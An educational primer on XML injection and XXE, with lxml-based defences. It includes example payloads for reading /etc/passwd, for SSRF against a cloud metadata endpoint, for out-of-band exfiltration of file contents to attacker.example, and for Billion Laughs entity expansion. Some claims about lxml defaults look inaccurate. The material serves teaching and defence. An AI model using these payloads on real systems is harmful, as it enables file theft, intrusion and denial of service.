# Learning notes: XML injection and XXE

> A from-scratch primer on XML-based injection: enough XML grammar to
> see why it's injectable at all, structural tag injection as the
> entry-level bug, DTDs and entities as the foundation XXE is built on,
> genuine XML External Entity (XXE) exploitation for file disclosure,
> SSRF, and blind/out-of-band exfiltration, and the one fix that closes
> nearly all of it. Grounded in OWASP's XXE guidance, MITRE's CWE, and
> the official lxml documentation (see **References** at the end).

---

## 1. XML basics (just enough)

XML (eXtensible Markup Language) represents data as a tree of nested
elements, each one opened and closed by a tag:

```xml
<badge>
  <visitor>Gon</visitor>
  <clearance>guest</clearance>
</badge>
```

Two grammar rules matter for everything that follows:

- **Reserved characters.** Five characters are never just "text" the
  moment they appear in element content or an attribute value, because
  they're how the grammar itself is written: `< > & ' "`. A literal
  occurrence of any of them inside what's meant to be plain text has to
  be escaped (`&lt; &gt; &amp; &apos; &quot;`), or the parser reads it
  as the start of new markup instead of literal content.
- **Well-formed vs. valid.** A document is **well-formed** if every tag
  that opens also closes, tags nest properly, and there's exactly one
  root element, a rule a real parser genuinely enforces: a stray,
  unbalanced `<` gets rejected outright. A document is separately
  **valid** if it also matches a declared schema (a DTD, or XSD). A
  document can be perfectly well-formed and still not be the *shape*
  its author intended, well-formedness says nothing about which
  elements are allowed to appear, or how many of each.

> **The whole bug class in one sentence:** XML injection happens when
> untrusted text is spliced into a hand-built XML document without
> escaping the five reserved characters first, letting attacker input
> add real structure (new elements, new entities) instead of staying
> literal content, exactly the same "attacker text becomes attacker
> logic" idea as every other injection class in these notes, applied
> to XML's own grammar.

---

## 2. How to tell you're dealing with XML injection at all

If an application accepts XML directly (a request body with
`Content-Type: application/xml`, a SOAP endpoint, a file upload that
gets parsed), that's your starting signal, no inference needed. If an
application accepts a plain value that later ends up *inside* a
server-built XML document (a name, a title, a search term reflected
into a generated report), the detection step is the same probe-and-compare
discipline used throughout these notes:

```
value = <                  -> malformed XML error? parser is genuinely running
value = &                  -> malformed XML error, or an "undefined entity" error?
value = </tag><x>test</x>  -> does the document still parse, with new structure?
```

A malformed-XML error on a bare `<` or `&` is itself useful positive
signal: it proves your input reached a real XML parser, not that the
application is safe, well-formedness enforcement and injection
resistance are two completely different things. The actual question is
what happens with a **well-formed** payload that adds structure the
template's author never anticipated, covered next.

---

## 3. Pattern A: tag/structure injection

Template, the shape a hand-built XML document takes when request data
is spliced in without escaping:

```python
TEMPLATE = "<badge><visitor>{name}</visitor><clearance>guest</clearance></badge>"
raw_xml = TEMPLATE.format(name=name)
```

For an ordinary name with no reserved characters, this produces exactly
the intended two-element document. But `name` was never validated to
be free of XML's own reserved characters before being trusted as safe
content. A name containing its own `<`/`>` doesn't become literal text
once parsed, it becomes new markup, read by the parser as real
document structure, exactly as if it had been part of the original
template.

```
name = </visitor><clearance>royal</clearance><visitor>x
```

Substituted character-for-character into the template:

```
<badge><visitor>                                    <- template
</visitor><clearance>royal</clearance><visitor>x     <- name, verbatim
</visitor><clearance>guest</clearance></badge>       <- template
```

concatenates to:

```xml
<badge><visitor></visitor><clearance>royal</clearance><visitor>x</visitor><clearance>guest</clearance></badge>
```

This is completely **well-formed**: every tag opens and closes, there's
exactly one root. It's simply no longer a two-element document, it now
has two `<clearance>` elements as siblings. Code that reads "the first
`<clearance>` anywhere in the tree" (`doc.find(".//clearance")`, or the
equivalent in any XML API) returns the **first match in document
order**, not "the one the template's author meant," so the injected
`<clearance>royal</clearance>` wins over the template's own
`<clearance>guest</clearance>`, simply because it appears earlier in
the concatenated string.

**The fix is escaping, every time, with no exceptions:**

```python
from xml.sax.saxutils import escape
raw_xml = TEMPLATE.format(name=escape(name))
```

**The better fix is never hand-building XML with string formatting at
all.** Construct the document with the parser's own element API,
which makes this entire pattern structurally impossible, there is no
string for attacker content to "break out of," because content is only
ever set as a node's `.text` property, never spliced into markup:

```python
from lxml import etree
badge = etree.Element("badge")
etree.SubElement(badge, "visitor").text = name
etree.SubElement(badge, "clearance").text = "guest"
```

---

## 4. DTDs and entities, briefly

Everything from here on is built on one more piece of XML grammar,
worth understanding slowly before XXE makes any sense.

- A **DTD** (Document Type Definition) is XML's original schema
  mechanism. A document can carry its own DTD inline, at the very top,
  inside a `<!DOCTYPE ...>` declaration, before the document body even
  starts.
- A DTD can declare **entities**: named shorthand referenced elsewhere
  in the document as `&name;`. The parser substitutes in the entity's
  defined value wherever that reference appears, much like a `#define`
  macro.
- An **internal** entity's value is a literal string written directly
  in the DTD: `<!ENTITY name "some text">`. Completely inert, it's just
  a fixed string the parser swaps in.
- An **external** entity's value is a *reference* the parser has to go
  fetch itself: `<!ENTITY name SYSTEM "some-uri">`. The `SYSTEM`
  keyword tells the parser "the real value lives at this URI, not in
  this document, go get it." This is the mechanism the acronym names:
  **X**ML **E**xternal **E**ntity.

```
internal entity: &name; -> "some text"              (inert, nothing fetched)
external entity: &name; -> contents of SYSTEM "uri"  (parser fetches it)
```

Whether any of this matters at all depends on two independent parser
settings, both of which have to be true before an external entity does
anything: the parser has to actually **process** a caller-supplied
DOCTYPE in the first place (often called `load_dtd`), and it has to
**resolve** entity references into their fetched content rather than
leaving them as literal `&name;` text (`resolve_entities`). Grounded
in lxml's own documentation specifically: `resolve_entities` is **on
by default**, but `load_dtd` is **off by default**, meaning a caller-
supplied DOCTYPE is ignored outright unless a developer has explicitly
turned DTD processing on (which legitimate DTD-based validation often
requires). The dangerous combination isn't one unusual setting, it's
DTD processing being turned on for a real reason, with entity
resolution's own default quietly riding along unless it's explicitly
turned back off.

---

## 5. Pattern B: XXE for local file disclosure

Once a parser processes a caller-supplied DTD and resolves external
entities, a request can declare its own entity and point it anywhere
the parser's own process can read:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request><document>&xxe;</document></request>
```

Walking through what the parser does with this, in order:

1. It reads the `<!DOCTYPE r [...]>` declaration and, because DTD
   processing is on, actually processes what's inside it, including
   the `<!ENTITY xxe SYSTEM "file:///etc/passwd">` declaration.
2. Because entity resolution is on, it doesn't just record that
   declaration, it immediately follows the `SYSTEM` reference, opening
   the file on the local filesystem (the same filesystem the
   application's own process runs on) and reading its contents.
3. Wherever `&xxe;` appears in the document body, the parser
   substitutes in that file's contents as if they'd been typed there
   directly.

If any downstream code then reads that element's resolved text and
reflects it back (an error message, an echoed confirmation, a log
entry shown to a user), the file's contents come back with it, because
by the time the element's `.text` is read, the resolved content is
textually indistinguishable from text the caller typed by hand. The
application has no way to tell the difference, because there isn't one
left by then.

This generalizes well past one specific file: swapping the `SYSTEM`
URI reads whatever the application process's own user has permission
to open, bounded only by filesystem permissions, not by anything the
application's own logic checks.

---

## 6. Pattern C: SSRF via XXE

A `SYSTEM` URI isn't limited to `file://`. Pointed at an `http(s)://`
URL instead, the exact same mechanism turns into Server-Side Request
Forgery: the *parser*, not the attacker's own machine, makes an
outbound request, from inside whatever network the application server
itself can reach.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

This matters specifically because it reaches places an external
attacker could never otherwise touch: a cloud provider's instance
metadata endpoint, an internal-only admin panel with no auth because
it "isn't exposed to the internet," a service bound only to localhost.
Whether this variant is even reachable depends on a *third* parser
setting most XXE write-ups skip past: lxml specifically blocks network
access during parsing **by default** (`no_network`, on by default),
independent of the DTD/entity settings above. An application has to
have explicitly turned that particular protection back off for the
`http://` variant specifically to work, file-URI disclosure and
network-URI SSRF are gated by two genuinely separate settings, not
one.

---

## 7. Pattern D: blind / out-of-band XXE

Every example so far assumes the application reflects the resolved
entity's value straight back in its response, a **reflected** XXE. A
route that parses XML but never echoes anything the entity touched is
still exploitable, just not directly: this is the exact same
"the in-band response tells you nothing, use a different channel
entirely" idea as out-of-band SQL injection, applied to XML instead of
SQL.

The classic technique chains a **parameter entity** (`%name;`, a
second entity syntax usable only inside the DTD itself, not the
document body) through an attacker-hosted external DTD:

```xml
<!-- the attacker's own externally-hosted DTD, fetched by the victim's parser -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?x=%file;'>">
%eval;
%exfil;
```

```xml
<!-- the payload actually sent to the vulnerable application -->
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">
  %remote;
]>
```

The victim's own parser fetches the attacker-hosted DTD, reads the
local file via a parameter entity, and builds a second entity whose
`SYSTEM` URI is the attacker's own server with the file's contents
folded into the URL's query string, then resolves *that* entity too,
sending the file's contents back to the attacker as an ordinary
outbound HTTP request the application never intended, all without the
application's own response ever needing to contain anything.

---

## 8. A related, genuinely different bug: entity expansion DoS

This is not data disclosure, and it's not stopped by the same fix as
Patterns B-D, which is worth being precise about. **Billion Laughs** is
a denial-of-service technique built from entities that reference each
other recursively, each layer multiplying the next:

```xml
<!DOCTYPE lol [
  <!ENTITY a "lol">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!-- continuing a few more layers reaches billions of characters -->
]>
<data>&c;</data>
```

None of these entities are external, nothing is ever fetched from
outside the document, so disabling external entity resolution (the fix
for Patterns B-D) does nothing to stop this. What stops it is a
separate control specifically limiting how large a parsed document is
allowed to grow through entity expansion, grounded in lxml's own
documentation: lxml's `huge_tree` setting (**off by default**) is
exactly that control, and leaving it off is what keeps this attack
mitigated even in an application that has otherwise left DTD
processing on for legitimate reasons. Disabling entities and limiting
expansion are two different protections, closing one never closes the
other.

---

## 9. The wider XML attack surface, briefly

A few sibling techniques worth knowing exist, even without a worked
example of each:

- **XPath injection**: the same "attacker text becomes structure" idea,
  but against an XPath query string instead of the document itself,
  e.g. `//user[name='{input}']`, read and fixed the same way SQL
  injection is, bound parameters in whichever XPath API supports them,
  never string concatenation.
- **XInclude**: a separate mechanism (`xi:include`) that pulls in
  *other* XML content by reference at parse time, dangerous for reasons
  that rhyme closely with XXE, and worth disabling by default
  alongside DTD processing unless a specific route genuinely needs it.

---

## 10. Defense (the actual fix)

- **Disable DTD processing and external entity resolution. This is the
  one fix to remember, full stop**, for everything in Patterns B-D:

  ```python
  from lxml import etree
  parser = etree.XMLParser(
      resolve_entities=False,
      load_dtd=False,
      no_network=True,
      huge_tree=False,
  )
  ```

  `resolve_entities=False` alone is often enough once DTDs are even
  reachable, but disabling `load_dtd` too means a caller-supplied
  `DOCTYPE` is never processed at all, the strongest posture, and the
  one that also closes Billion-Laughs-style internal-entity expansion
  as a side effect of never processing the DTD that declares it.
- **Separately limit entity expansion even if DTDs are required for a
  legitimate reason** (`huge_tree=False`, or the equivalent secure-
  processing flag in another parser). This is a distinct protection
  from disabling external entities, covered in §8, don't assume one
  setting buys both.
- **Escape XML's five reserved characters in every value inserted into
  a hand-built document**, for Pattern A specifically, or better,
  **never hand-build XML with string formatting at all.** Construct
  documents with the parser's own element-construction API, which
  makes tag injection structurally impossible.
- **Validate structure, not just content.** A schema-validating parser
  rejects a document with an unexpected element count or shape
  outright, independent of whether any single character was
  disallowed, closing Pattern A even if escaping were somehow missed
  somewhere.
- **Prefer a data format with no DTD/entity concept at all**, where the
  application design allows it. JSON has no equivalent mechanism, so an
  application that can move off XML removes this entire class of bug
  rather than just mitigating it.

---

## 11. References (official / primary)

- **OWASP, XML External Entity (XXE) Processing:**
  https://community.owasp.org/vulnerabilities/XML_External_Entity_(XXE)_Processing
  (DTD/entity mechanics, the `SYSTEM` identifier, SSRF via XXE,
  out-of-band disclosure via DNS exfiltration, and the four conditions
  that make a parser exploitable)
- **OWASP Cheat Sheet, XML External Entity Prevention:**
  https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
  (official, parser-by-parser and language-by-language prevention
  guidance, and the explicit treatment of entity-expansion DoS as a
  related but separate problem from XXE itself)
- **MITRE CWE-611, Improper Restriction of XML External Entity
  Reference:** https://cwe.mitre.org/data/definitions/611.html
- **lxml, Parsing XML and HTML with lxml:**
  https://lxml.de/parsing.html
  (the `resolve_entities`, `load_dtd`, `no_network`, and `huge_tree`
  parser keyword arguments and their actual defaults)
- **XML 1.0 (Fifth Edition), W3C Recommendation:**
  https://www.w3.org/TR/xml/
  (the formal grammar for well-formedness, entities, and DTDs)
